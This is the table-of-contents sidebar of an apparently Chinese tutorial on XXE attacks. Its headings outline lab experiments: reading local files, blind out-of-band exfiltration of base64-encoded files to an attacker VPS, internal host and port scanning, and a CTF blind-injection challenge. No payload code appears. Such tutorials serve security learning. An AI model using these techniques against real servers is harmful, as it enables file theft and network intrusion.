class="nav-link" href="#示例代码：-1"><span class="nav-number">1.58.3.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#其实除了在-DTD-中定义元素（其实就是对应-XML-中的标签）以外，我们还能在-DTD-中定义实体-对应XML-标签中的内容-，毕竟-ML-中除了能标签以外，还需要有些内容是固定的"><span class="nav-number">1.58.3.1.</span> <span class="nav-text">其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-2"><span class="nav-number">1.58.4.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这里-定义元素为-ANY-说明接受任何元素，但是定义了一个-xml-的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在-XML-中通过-amp-符号进行引用），那么-XML-就可以写成这样"><span class="nav-number">1.58.4.1.</span> <span class="nav-text">这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-3"><span class="nav-number">1.58.5.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们使用-amp-xxe-对-上面定义的-xxe-实体进行了引用，到时候输出的时候-amp-xxe-就会被-“test”-替换。"><span class="nav-number">1.58.5.1.</span> <span class="nav-text">我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#下面是重点："><span class="nav-number">1.59.</span> <span class="nav-text">下面是重点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#重点一："><span class="nav-number">1.60.</span> <span class="nav-text">重点一：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的-dtd-文件中引用，我们看下面的代码："><span class="nav-number">1.60.0.1.</span> <span class="nav-text">实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-4"><span class="nav-number">1.60.1.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这样对引用资源所做的任何更改都会在文档中自动更新-非常方便（方便永远是安全的敌人）"><span class="nav-number">1.60.1.1.</span> <span class="nav-text">这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当然，还有一种引用方式是使用-引用公用-DTD的方法，语法如下："><span class="nav-number">1.60.1.2.</span> <span class="nav-text">当然，还有一种引用方式是使用 引用公用 DTD的方法，语法如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个在我们的攻击中也可以起到和-SYSTEM-一样的作用"><span class="nav-number">1.60.1.3.</span> <span class="nav-text">这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#重点二："><span class="nav-number">1.61.</span> <span class="nav-text">重点二：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。"><span class="nav-number">1.61.1.</span> <span class="nav-text">我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-通用实体"><span class="nav-number">1.62.</span> <span class="nav-text">1.通用实体</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#用-amp-实体名-引用的实体，他在DTD-中定义，在-XML-文档中引用"><span class="nav-number">1.62.1.</span> <span class="nav-text">用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-5"><span class="nav-number">1.62.2.</span> <span class="nav-text">示例代码：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#四、我们能做什么"><span class="nav-number">1.63.</span> <span class="nav-text">四、我们能做什么</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#上一节疯狂暗示了外部实体，那他究竟能干什么？"><span class="nav-number">1.63.1.</span> <span class="nav-text">上一节疯狂暗示了外部实体，那他究竟能干什么？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例如下面这段代码。"><span class="nav-number">1.63.2.</span> <span class="nav-text">例如下面这段代码。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#既然能读-dtd-那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？"><span class="nav-number">1.63.3.</span> <span class="nav-text">既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实验一：有回显读本地敏感文件-Normal-XXE"><span class="nav-number">1.64.</span> <span class="nav-text">实验一：有回显读本地敏感文件(Normal XXE)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这个实验的攻击场景模拟的是在服务能接收并解析-XML-格式的输入并且有回显的时候，我们就能输入我们自定义的-XML-代码，通过引用外部实体的方法，引用服务器上面的文件"><span class="nav-number">1.64.1.</span> <span class="nav-text">这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#本地服务器上放上解析-XML-的-php-代码："><span class="nav-number">1.64.2.</span> <span class="nav-text">本地服务器上放上解析 XML 的 php 代码：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#示例代码：-6"><span class="nav-number">1.65.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#xml-php"><span class="nav-number">1.65.1.</span> <span class="nav-text">xml.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload"><span class="nav-number">1.65.2.</span> <span class="nav-text">payload:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以成功的读取到文件。"><span class="nav-number">1.65.3.</span> <span class="nav-text">可以成功的读取到文件。</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，如果我们在文件中很多的特殊字符呢。"><span class="nav-number">1.65.3.1.</span> <span class="nav-text">但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，如果我们在文件中很多的特殊字符呢。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因此我们要用CDATA。"><span class="nav-number">1.65.4.</span> <span class="nav-text">因此我们要用CDATA。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的-lt-gt-amp-或者”-字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是-xml标记"><span class="nav-number">1.65.5.</span> <span class="nav-text">有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者” 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注意："><span class="nav-number">1.65.6.</span> <span class="nav-text">注意：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#那我们把我们的读出来的数据放在-CDATA-中输出就能进行绕过，但是怎么做到，我们来简答的分析一下："><span class="nav-number">1.65.7.</span> <span class="nav-text">那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#首先，找到问题出现的地方，问题出现在"><span class="nav-number">1.65.8.</span> <span class="nav-text">首先，找到问题出现的地方，问题出现在</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#引用并不接受可能会引起-xml-格式混乱的字符-在XML中，有时实体内包含了些字符，如-amp-lt-gt-”-’等。这些均需要对其进行转义，否则会对XML解释器生成错误-，我们想在引用的两边加上-“”-但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法"><span class="nav-number">1.65.8.1.</span> <span class="nav-text">引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注意，这里面的三个实体都是字符串形式，连在一起会报错，这说明我们不能在-xml-中进行拼接，而是需要在拼接以后再在-xml-中调用，那么要想在-DTD"><span class="nav-number">1.65.9.</span> <span class="nav-text">注意，这里面的三个实体都是字符串形式，连在一起会报错，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在 DTD</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#中拼接，我们知道我们只有一种选择，就是使用-参数实体"><span class="nav-number">1.65.10.</span> <span class="nav-text">中拼接，我们知道我们只有一种选择，就是使用 参数实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload如下：-1"><span class="nav-number">1.65.11.</span> <span class="nav-text">payload如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#evil-dtd"><span class="nav-number">1.65.12.</span> <span class="nav-text">evil.dtd</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#现在就可以来去自由的读取了。"><span class="nav-number">1.65.13.</span> <span class="nav-text">现在就可以来去自由的读取了。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#新的问题出现"><span class="nav-number">1.66.</span> <span class="nav-text">新的问题出现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#但是，你想想也知道，本身人家服务器上的-XML-就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析-XML-的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带"><span class="nav-number">1.66.1.</span> <span class="nav-text">但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#新的解决方法"><span class="nav-number">1.67.</span> <span class="nav-text">新的解决方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#想要外带就必须能发起请求，那么什么地方能发起请求呢？-很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了-并且根据规范，我们必须在一个-DTD-文件中才能完成“请求中引用另一次请求的结果”的要求"><span class="nav-number">1.67.1.</span> <span class="nav-text">想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><span class="nav-number">1.68.</span> <span class="nav-text">实验二：无回显读取本地敏感文件(Blind OOB XXE)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#xml-php-1"><span class="nav-number">1.68.1.</span> <span class="nav-text">xml.php</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#test-dtd"><span class="nav-number">1.69.</span> <span class="nav-text">test.dtd</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我发现上面这段代码由于解析的问题将-send-前面的-HTML-实体转化成了-虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码"><span class="nav-number">1.69.1.</span> <span class="nav-text">我发现上面这段代码由于解析的问题将 send 前面的 HTML 实体转化成了 % ,虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-1"><span class="nav-number">1.69.2.</span> <span class="nav-text">payload:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#结果如下：-2"><span class="nav-number">1.69.3.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们清楚第看到服务器端接收到了我们用-base64-编码后的敏感文件信息-编码也是为了不破坏原本的XML语法-，不编码会报错。"><span class="nav-number">1.69.4.</span> <span class="nav-text">我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#整个调用过程："><span class="nav-number">1.70.</span> <span class="nav-text">整个调用过程：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们从-payload-中能看到-连续调用了三个参数实体-remote-int-send-，这就是我们的利用顺序，-remote-先调用，调用后请求远程服务器上的-test-dtd-，有点类似于将-test-dtd-包含进来，然后-int-调用-test-dtd-中的-file-file-就会去获取服务器上面的敏感文件，然后将-file-的结果填入到-send-以后-因为实体的值中不能有-所以将其转成html实体编码-amp-37-，我们再调用-send-把我们的读取到的数据发送到我们的远程-vps-上，这样就实现了外带数据的效果，完美的解决了-XXE-无回显的问题。"><span class="nav-number">1.70.1.</span> <span class="nav-text">我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#新的思考："><span class="nav-number">1.71.</span> <span class="nav-text">新的思考：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们刚刚都只是做了一件事，那就是通过-file-协议读取本地文件，或者是通过-http-协议发出请求，熟悉-SSRF-的童鞋应该很快反应过来，这其实非常类似于-SSRF-，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如-192-168-0-10-8080）是不是也能实现-SSRF-同样的效果呢？没错，XXE-其实也是一种-SSRF-的攻击手法，因为-SSRF-其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。"><span class="nav-number">1.71.1.</span> <span class="nav-text">我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#新的利用："><span class="nav-number">1.72.</span> <span class="nav-text">新的利用：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#所以要想更进一步的利用我们不能将眼光局限于-file-协议，我们必须清楚地知道在何种平台，我们能用何种协议。"><span class="nav-number">1.72.1.</span> <span class="nav-text">所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如图所示："><span class="nav-number">1.73.</span> <span class="nav-text">如图所示：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP在安装扩展以后还能支持的协议："><span class="nav-number">1.73.1.</span> <span class="nav-text">PHP在安装扩展以后还能支持的协议：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如图所示：-1"><span class="nav-number">1.73.2.</span> <span class="nav-text">如图所示：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注意：-1"><span class="nav-number">1.74.</span> <span class="nav-text">注意：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-其中从2012年9月开始，Oracle-JDK版本中删除了对gopher方案的支持，后来又支持的版本是-Oracle-JDK-1-7"><span class="nav-number">1.74.1.</span> <span class="nav-text">1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#update-7-和-Oracle-JDK-1-6-update-35"><span class="nav-number">1.74.2.</span> <span class="nav-text">update 7 和 Oracle JDK 1.6 update 35</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-libxml-是-PHP-的-xml-支持"><span class="nav-number">1.74.3.</span> <span class="nav-text">2.libxml 是 PHP 的 xml 支持</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实验三：HTTP-内网主机探测"><span class="nav-number">1.75.</span> <span class="nav-text">实验三：HTTP 内网主机探测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们以存在-XXE-漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用-file-协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux-为例），我们可以尝试读取-etc-network-interfaces-或者-proc-net-arp-或者-etc-host-文件以后我们就有了大致的探测方向了"><span class="nav-number">1.75.1.</span> <span class="nav-text">我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下面是一个探测脚本的实例："><span class="nav-number">1.75.2.</span> <span class="nav-text">下面是一个探测脚本的实例：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#返回的结果"><span class="nav-number">1.75.3.</span> <span class="nav-text">返回的结果</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实验四：HTTP-内网主机端口扫描"><span class="nav-number">1.76.</span> <span class="nav-text">实验四：HTTP 内网主机端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip-地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合-burpsuite-进行端口探测"><span class="nav-number">1.76.1.</span> <span class="nav-text">找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#比如我们传入："><span class="nav-number">1.76.2.</span> <span class="nav-text">比如我们传入：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#返回结果："><span class="nav-number">1.76.3.</span> <span class="nav-text">返回结果：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为-参数-然后利用-bp-的-intruder-来帮我们探测"><span class="nav-number">1.76.4.</span> <span class="nav-text">这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如下图所示："><span class="nav-number">1.76.5.</span> <span class="nav-text">如下图所示：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#至此，我们已经有能力对整个网段进行了一个全面的探测-并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用-XXE-打击内网服务器甚至能直接-getshell（比如有些-内网的未授权-redis-或者有些通过-http-get-请求就能直接getshell-的-比如-strus2）"><span class="nav-number">1.76.6.</span> <span class="nav-text">至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实验五：内网盲注-CTF"><span class="nav-number">1.77.</span> <span class="nav-text">实验五：内网盲注(CTF)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2018-强网杯-有一道题就是利用-XXE-漏洞进行内网的-SQL-盲注的-大致的思路如下："><span class="nav-number">1.77.1.</span> <span class="nav-text">2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#首先在外网的一台ip地址为-39-107-33-75-33899-的评论框处测试发现-XXE-漏洞，我们输入-xml-以及-dtd-会出现报错"><span class="nav-number">1.77.2.</span> <span class="nav-text">首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如图所示：-2"><span class="nav-number">1.78.</span> <span class="nav-text">如图所示：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件-这个点是-Blind-XXE-，必须使用参数实体，外部引用-DTD"><span class="nav-number">1.78.1.</span> <span class="nav-text">既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#拿到第一部分-flag"><span class="nav-number">1.78.2.</span> <span class="nav-text">拿到第一部分 flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#然后我们考虑内网有没有东西，我们读取"><span class="nav-number">1.78.3.</span> <span class="nav-text">然后我们考虑内网有没有东西，我们读取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#找到内网的另一台服务器的-ip-地址-192-168-223-18"><span class="nav-number">1.78.4.</span> <span class="nav-text">找到内网的另一台服务器的 ip 地址 192.168.223.18</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#拿到这个-ip-我们考虑就要使用-XXE-进行端口扫描了，然后我们发现开放了-80-端口，然后我们再进行目录扫描，找到一个-test-php-，根据提示，这个页面的-shop-参数存在一个注入-但是因为本身这个就是一个-Blind-XXE-我们的对服务器的请求都是在我们的远程-DTD-中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的-DTD-文件，于是我们的脚本就要挂在我们的-VPS-上，一边边修改-DTD-一边向存在-XXE-漏洞的主机发送请求，脚本就像下面这个样子"><span class="nav-number">1.78.5.</span> <span class="nav-text">拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-7"><span class="nav-number">1.78.6.</span> <span class="nav-text">示例代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解"><span class="nav-number">1.78.7.</span> <span class="nav-text">这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实验六：文件上传"><span class="nav-number">1.79.</span> <span class="nav-text">实验六：文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们之前说的好像都是-php-相关，但是实际上现实中很多都是-java-的框架出现的-XXE-漏洞，通过阅读文档，我发现-Java-中有一个比较神奇的协议-jar-，-php-中的-phar-似乎就是为了实现-jar-的类似的功能设计出来的。"><span class="nav-number">1.79.1.</span> <span class="nav-text">我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#jar-协议的格式："><span class="nav-number">1.79.2.</span> <span class="nav-text">jar:// 协议的格式：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实例：-1"><span class="nav-number">1.79.3.</span> <span class="nav-text">实例：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#jar-能从远程获取-jar-文件，然后将其中的内容进行解压，等等，这个功能似乎比-phar-强大啊，phar-是没法远程加载文件的（因此-phar-一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的-blackhat-讲述的-phar-的反序列化很有趣，Orange-曾在2017年的-hitcon-中出过这道题）"><span class="nav-number">1.79.4.</span> <span class="nav-text">jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jar-协议处理文件的过程："><span class="nav-number">1.80.</span> <span class="nav-text">jar 协议处理文件的过程：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-下载-jar-zip-文件到临时文件中"><span class="nav-number">1.80.1.</span> <span class="nav-text">(1) 下载 jar/zip 文件到临时文件中</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-提取出我们指定的文件"><span class="nav-number">1.80.2.</span> <span class="nav-text">(2) 提取出我们指定的文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-删除临时文件"><span class="nav-number">1.80.3.</span> <span class="nav-text">(3) 删除临时文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下面是我的一些测试过程："><span class="nav-number">1.80.4.</span> <span class="nav-text">下面是我的一些测试过程：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我首先在本地模拟一个存在-XXE-的程序，网上找的能直接解析-XML-文件的-java-源码"><span class="nav-number">1.80.5.</span> <span class="nav-text">我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-8"><span class="nav-number">1.80.6.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#xml-test-java"><span class="nav-number">1.80.6.1.</span> <span class="nav-text">xml_test.java</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#有了这个源码以后，我们需要在本地建立一个-xml-文件-，我取名为-student-xml"><span class="nav-number">1.80.7.</span> <span class="nav-text">有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#student-xml"><span class="nav-number">1.80.7.1.</span> <span class="nav-text">student.xml</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#目录结构如下图："><span class="nav-number">1.80.8.</span> <span class="nav-text">目录结构如下图：</span></a></li><li 